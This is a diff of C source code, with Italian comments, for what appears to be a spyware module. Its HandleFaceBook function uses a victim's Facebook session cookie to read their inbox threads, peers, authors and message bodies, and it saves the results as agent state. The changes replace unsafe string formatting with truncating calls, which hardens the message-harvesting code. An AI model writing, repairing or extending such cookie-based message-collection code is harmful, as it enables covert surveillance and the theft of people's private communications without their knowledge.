@@ -74,7 +74,7 @@ void SetLastFBTstamp(char *user, DWORD tstamp)
 	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
 		// Lo scrive nella prima entry libera
 		if (last_tstamp_array[i].user[0] == 0) {
-			_snprintf_s(last_tstamp_array[i].user, _TRUNCATE, "%s", user);		
+			_snprintf_s(last_tstamp_array[i].user, 48, _TRUNCATE, "%s", user);		
 			last_tstamp_array[i].tstamp = tstamp;
 			Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
 			return;
@@ -122,7 +122,7 @@ DWORD HandleFaceBook(char *cookie)
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
 	*parser2=0;
-	sprintf_s(user, "%s", parser1);
+	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
 	SAFE_FREE(r_buffer);
 
 	// Torna utente "0" se non siamo loggati
@@ -163,7 +163,7 @@ DWORD HandleFaceBook(char *cookie)
 		urldecode((char *)parser1);
 		// Se voglio andare piu' indietro aggiungo alla richiesta...per ora pero' va bene cosi'
 		// &thread_offset=0&num_msgs=60
-		swprintf_s(url, L"/ajax/messaging/async.php?sk=inbox&action=read&tid=%S&__a=1", parser1);
+		_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/ajax/messaging/async.php?sk=inbox&action=read&tid=%S&__a=1", parser1);
 		parser1 = parser2 + 1;
 
 		parser1 = (BYTE *)strstr((char *)parser1, FB_MESSAGE_TSTAMP_IDENTIFIER);
@@ -184,7 +184,7 @@ DWORD HandleFaceBook(char *cookie)
 		if (!parser2)
 			break;
 		*parser2 = 0;
-		sprintf_s(peers, "%s", parser1);
+		_snprintf_s(peers, sizeof(peers), _TRUNCATE, "%s", parser1);
 		parser1 = parser2 + 1;
 
 		// Pe ogni thread chiede tutti i rispettivi messaggi
@@ -214,7 +214,7 @@ DWORD HandleFaceBook(char *cookie)
 			parser_inner1 = parser_inner2;
 			for (;*(parser_inner1) != '>'; parser_inner1--);
 			parser_inner1++;
-			sprintf_s(author, "%s", parser_inner1);
+			_snprintf_s(author, sizeof(author), _TRUNCATE, "%s", parser_inner1);
 			parser_inner1 = parser_inner2 + 1;
 
 			// Cicla per tutti i possibili body del messaggio
